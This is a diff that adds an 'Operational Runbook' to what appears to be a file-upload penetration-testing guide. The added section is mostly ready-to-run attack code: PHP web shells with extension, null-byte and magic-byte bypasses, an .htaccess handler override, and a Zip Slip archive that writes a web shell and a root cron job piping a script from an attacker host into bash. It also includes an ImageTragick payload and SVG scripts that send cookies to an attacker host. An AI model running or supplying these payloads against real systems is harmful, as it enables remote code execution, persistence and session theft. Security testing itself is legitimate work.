@@ -141,6 +141,159 @@ Upload surfaces are high risk: server-side execution (RCE), stored XSS, malware 
 - Direct-to-bucket uploads with Lambda/Workers post-processing; verify security decisions are not delegated to frontends
 - CDN caching of uploaded content; ensure correct cache keys and headers
 
+## Operational Runbook
+
+Once an upload endpoint is identified, this is the canonical exploitation flow. Goal: get something dangerous past the validator, then prove it's executable / renderable / extractable.
+
+### Step 1 — baseline + extract the allow-list
+
+```bash
+# Upload a clean image; capture the response (where does it land?)
+curl -s -F "file=@/tmp/sample.jpg" "<TARGET>/upload" -o /tmp/baseline.json
+cat /tmp/baseline.json | jq .
+# Document: returned URL/key, content-type stored, filename echo behavior
+
+# Try blocked types one at a time to map the allow-list
+for ext in php phtml php5 phar jsp jspx aspx asp pl py rb sh exe; do
+  echo '<?php echo "x"; ?>' > /tmp/probe.$ext
+  resp=$(curl -s -F "file=@/tmp/probe.$ext" "<TARGET>/upload" -w '\n%{http_code}\n' | tail -1)
+  echo "$ext → $resp"
+done
+```
+
+### Step 2 — extension bypass library
+
+```bash
+# Each tries to slip a PHP file past extension/MIME check.
+# Run each, then GET the stored URL to test executability.
+
+# A. Double extension (server only checks last)
+echo '<?php system($_GET["c"]); ?>' > /tmp/shell.jpg.php
+
+# B. Reverse double extension (some servers check first)
+echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php.jpg
+
+# C. Null byte truncation (older PHP, FILES validation)
+echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php%00.jpg
+
+# D. Trailing dot / space / slash (Windows truncates these)
+cp /tmp/shell.php.jpg "/tmp/shell.php."
+cp /tmp/shell.php.jpg "/tmp/shell.php "
+cp /tmp/shell.php.jpg "/tmp/shell.php/"
+
+# E. Alternate executable extension
+echo '<?php system($_GET["c"]); ?>' > /tmp/shell.phtml
+echo '<?php system($_GET["c"]); ?>' > /tmp/shell.phar
+echo '<?php system($_GET["c"]); ?>' > /tmp/shell.pht
+
+# F. Apache/nginx parser bug — .htaccess upload (when allowed)
+cat > /tmp/.htaccess <<'EOF'
+AddType application/x-httpd-php .pwn
+EOF
+
+# G. SVG with JS (XSS-via-upload on platforms that serve images inline)
+cat > /tmp/xss.svg <<'EOF'
+<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//attacker/?c='+document.cookie)"/>
+EOF
+
+# Upload each
+for f in /tmp/shell.*; do
+  curl -s -F "file=@$f" "<TARGET>/upload" -w '\nFILE:%{filename_effective} → %{http_code}\n'
+done
+```
+
+### Step 3 — content-type / magic-byte bypass
+
+Some servers check both MIME and the file's magic bytes. Craft a valid header for an "image" with malicious tail:
+
+```bash
+# A. GIF magic + PHP tail
+printf 'GIF89a\n<?php system($_GET["c"]); ?>' > /tmp/gif_php.php
+file /tmp/gif_php.php  # confirms: "GIF image data"
+
+# B. JPEG magic
+printf '\xff\xd8\xff\xe0\x00\x10JFIF\n<?php system($_GET["c"]); ?>' > /tmp/jpg_php.php
+
+# C. PNG magic (note: 8-byte header)
+printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > /tmp/png_php.php
+
+# Upload with image content-type
+curl -s -F "file=@/tmp/gif_php.php;type=image/gif" "<TARGET>/upload"
+```
+
+### Step 4 — verify executability
+
+After a successful upload, GET the stored URL and try to execute:
+
+```bash
+# Find where the upload landed (response usually returns the URL)
+STORED_URL=$(curl -s -F "file=@/tmp/gif_php.php;type=image/gif" "<TARGET>/upload" | jq -r '.url')
+
+# Trigger PHP execution
+curl -s "$STORED_URL?c=id"
+# Expect: uid=33(www-data) → confirmed RCE via upload
+```
+
+If the server returns the raw `<?php` source → file is served as static. Try renaming to `.phtml`, `.phar`, or `.pht` to coax the handler into executing.
+
+### Step 5 — Zip Slip via archive upload
+
+When the target extracts uploaded archives server-side:
+
+```python
+import zipfile
+with zipfile.ZipFile('/tmp/zipslip.zip', 'w') as z:
+    # Plain content
+    z.writestr('readme.txt', b'normal file')
+    # Traversal — overwrite webroot
+    z.writestr('../../../var/www/html/shell.php',
+               b'<?php system($_GET["c"]); ?>')
+    # Linux-style
+    z.writestr('../../../../etc/cron.d/pwn',
+               b'* * * * * root curl http://attacker/sh|bash')
+```
+
+Upload + check whether `shell.php` or the cron file landed where intended.
+
+### Step 6 — image-conversion / preview pipeline pivots
+
+ImageMagick / GraphicsMagick have a long history of conversion-time RCE:
+
+```bash
+# ImageTragick (CVE-2016-3714) — still works on unpatched setups
+cat > /tmp/exploit.mvg <<'EOF'
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://attacker.example/oast)'
+pop graphic-context
+EOF
+curl -s -F "file=@/tmp/exploit.mvg" "<TARGET>/upload"
+# Watch OAST for callback
+```
+
+```bash
+# Polyglot — PDF/PHP file that's also a valid PDF
+# Use trufflehog / pdf-parser to inspect generated artifacts
+```
+
+### Step 7 — XML / SVG / HTML upload → XSS
+
+```bash
+# SVG with embedded script (renders if served inline)
+cat > /tmp/xss.svg <<'EOF'
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>fetch('//attacker/?c='+document.cookie)</script>
+</svg>
+EOF
+curl -s -F "file=@/tmp/xss.svg" "<TARGET>/upload"
+
+# HTML upload (if Content-Disposition: inline served)
+echo '<script>alert(1)</script>' > /tmp/xss.html
+curl -s -F "file=@/tmp/xss.html" "<TARGET>/upload"
+```
+
+Document: severity scales with what's served — critical when uploaded files are served from the *same origin* as authenticated session cookies; lower when served from a distinct, cookie-less CDN domain.
+
 ## Testing Methodology
 
 1. **Map the pipeline** - Client → ingress → storage → processors → serving. Note where validation and auth occur
